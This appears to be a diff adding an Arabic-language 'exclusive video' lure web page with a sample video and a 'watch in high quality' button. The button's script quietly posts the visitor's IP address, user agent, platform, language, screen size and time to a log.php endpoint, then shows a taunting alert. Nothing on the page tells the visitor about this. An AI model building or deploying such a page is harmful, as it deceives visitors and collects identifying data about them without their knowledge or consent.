@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيديو حصري 🔥</title>
+    <style>
+        body { background: black; color: white; font-family: Arial; text-align: center; padding-top: 50px; }
+        video { max-width: 90%; border-radius: 20px; box-shadow: 0 0 30px red; }
+        .btn { background: red; padding: 15px 40px; border: none; color: white; font-size: 20px; border-radius: 50px; cursor: pointer; margin-top: 20px; }
+        .btn:hover { background: darkred; }
+    </style>
+</head>
+<body>
+    <h1>🔥 فيديو حصري مشتعل 🔥</h1>
+    <video id="myVideo" controls autoplay muted>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+        متصفحك لا يدعم الفيديو.
+    </video>
+    <br>
+    <button class="btn" onclick="sendData()">❤️ شاهد بجودة عالية ❤️</button>
+
+    <script>
+        function sendData() {
+            fetch('log.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>',
+                    ua: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: screen.width + 'x' + screen.height,
+                    time: new Date().toLocaleString()
+                })
+            });
+            alert('تم رفع الجودة! استمتع 😈');
+        }
+    </script>
+</body>
+</html>
